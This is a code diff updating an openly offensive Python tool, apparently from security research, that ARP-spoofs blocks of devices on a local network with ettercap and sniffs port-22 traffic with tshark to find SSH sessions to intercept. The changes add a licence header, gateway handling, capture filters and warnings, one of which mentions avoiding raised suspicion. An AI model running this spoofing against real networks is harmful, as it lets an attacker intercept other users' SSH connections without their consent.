@@ -1,8 +1,21 @@
 #!/usr/bin/python3
 #
-# JoesAwesomeSSHMITMVictimFinder.py, Copyright 2017, Joe Testa
+# JoesAwesomeSSHMITMVictimFinder.py
+# Copyright (C) 2017  Joe Testa <jtesta@positronsecurity.com>
 #
-# Author:  Joe Testa <jtesta@positronsecurity.com>
+# This program is free software: you can redistribute it and/or modify
+# it under the terms version 3 of the GNU General Public License as
+# published by the Free Software Foundation.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.
+#
+#
 # Version: 1.0
 # Date:    June 28, 2017
 #
@@ -24,10 +37,17 @@ if sys.version_info.major < 3:
     print('Error: Python3 is required.  Re-run using python3 interpreter.')
     exit(-1)
 
-# Check if netaddr and netifaces modules can be imported.  Otherwise, print
+# Check if the netaddr and netifaces modules can be imported.  Otherwise, print
 # a useful message to the user with how to install them.
+old_netifaces = False
 try:
     import netaddr, netifaces
+
+    # Check if we're using an old version of netifaces (used in Ubuntu 14 and
+    # Linux Mint 17).  If so, the user will need to specify the gateway
+    # manually.
+    if (netifaces.version.startswith('0.8')):
+        old_netifaces = True
 except ImportError as e:
     print("The Python3 netaddr and/or netifaces module is not installed.  Fix with:  apt install python3-netaddr python3-netifaces")
     exit(-1)
@@ -176,6 +196,20 @@ def check_prereqs():
         print("Error: you must run this script as root.")
         exit(-1)
 
+    # Check if there are existing PREROUTING NAT rules enabled, and warn the
+    # user of potential side-effects.
+    try:
+        hProc = subprocess.Popen(['iptables', '-t', 'nat', '-nL', 'PREROUTING'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
+        so, se = hProc.communicate()
+        prerouting_output = so.decode('ascii')
+
+        # Output with no rules has two lines.
+        if prerouting_output.count("\n") > 2:
+            print("\nWARNING: it appears that you have entries in your PREROUTING NAT table.  Searching for SSH connections on the LAN with this script while PREROUTING rules are enabled may have unintended side-effects.  The output of 'iptables -t nat -nL PREROUTING' is:\n\n%s\n\n" % prerouting_output)
+    except FileNotFoundError as e:
+        print('Warning: failed to run iptables.  Continuing...')
+        pass
+
 
 # Returns True if a program is installed on the system, otherwise False.
 def find_prog(prog_args):
@@ -283,11 +317,18 @@ def blocketize_devices(devices, block_size):
     return device_blocks
 
 
-def arp_spoof_and_monitor(interface, gateway, device_block, listen_time):
+def arp_spoof_and_monitor(interface, local_addresses, gateway, device_block, listen_time):
     global ettercap_proc, tshark_proc
 
     # Run tshark with an SSH filter.
-    tshark_args = ['tshark', '-i', interface, '-f', 'port 22', '-T', 'fields', '-e', 'ip.src', '-e', 'ip.dst', '-e', 'tcp.port']
+    tshark_args = ['tshark', '-i', interface, '-T', 'fields', '-e', 'ip.src', '-e', 'ip.dst', '-e', 'tcp.port']
+
+    # Exclude packets to or from the local machine.
+    if len(local_addresses) > 0:
+        tshark_args.extend(['-f', 'port 22 and not(host %s)' % ' or host '.join(local_addresses)])
+    else:
+        tshark_args.extend(['-f', 'port 22'])
+
     d('Running tshark: %s' % ' '.join(tshark_args))
     tshark_proc = subprocess.Popen(tshark_args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 
@@ -345,6 +386,7 @@ def arp_spoof_and_monitor(interface, gateway, device_block, listen_time):
            remote_client = ip1
        else:
            print('Strange tshark output found: [%s]' % line)
+           print("\tdevice block: [%s]" % ",".join(device_block))
            continue
 
        # Look for outgoing connections.
@@ -389,6 +431,12 @@ if __name__ == '__main__':
     parser.add_argument('--one-pass', help='perform one pass of the network only, instead of looping', action='store_true')
     parser.add_argument('-v', '--verbose', help='enable verbose messages', action='store_true')
     parser.add_argument('-d', '--debug', help='enable debugging messages', action='store_true')
+
+    # If we loaded an old netifaces module, the user must specify the gateway
+    # manually.
+    if old_netifaces:
+        required.add_argument('--gateway', help='the network gateway', required=True)
+
     args = vars(parser.parse_args())
 
 
@@ -422,15 +470,15 @@ if __name__ == '__main__':
         exit(-1)
 
     # Add our address(es) to the ignore list.
-    found_address = False
+    local_addresses = []
     if netifaces.AF_INET in addresses:
         for net_info in addresses[netifaces.AF_INET]:
-            found_address = True
             address = net_info['addr']
             print("Found local address %s and adding to ignore list." % address)
+            local_addresses.append(address)
             ignore_list.append(address)
 
-    if not found_address:
+    if len(local_addresses) == 0:
         print("Error: failed to get the IP address for interface %s" % interface)
         exit(-1)
 
@@ -440,7 +488,10 @@ if __name__ == '__main__':
     print("Using network CIDR %s." % net_cidr)
 
     # Get the default gateway.
-    gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]
+    if old_netifaces:
+        gateway = args['gateway']
+    else:
+        gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]
     print("Found default gateway: %s" % gateway)
 
     # The number of IPs in the LAN to ARP spoof at a time.  This should be a
@@ -467,6 +518,11 @@ if __name__ == '__main__':
         print('The network will be scanned in only one pass.')
     print("\n")
 
+    # If the user raised the block size to 10 or greater, warn them about the
+    # potential consequences.
+    if block_size >= 10:
+        print("WARNING: setting the block size too high will cause strain on your network interface.  Eventually, your interface will start dropping frames, causing a network denial-of-service and greatly raising suspicion.  However, raising the block size is safe on low-utilization networks.  You better know what you're doing!\n")
+
     # Enable the signal handlers so that ettercap and tshark gracefully shut
     # down on CTRL-C.
     signal.signal(signal.SIGINT, signal_handler)
@@ -484,7 +540,7 @@ if __name__ == '__main__':
 
         # ARP spoof and monitor each block.
         for device_block in device_blocks:
-            arp_spoof_and_monitor(interface, gateway, device_block, listen_time)
+            arp_spoof_and_monitor(interface, local_addresses, gateway, device_block, listen_time)
 
         # If we are only supposed to do one pass, then stop now.
         if one_pass:
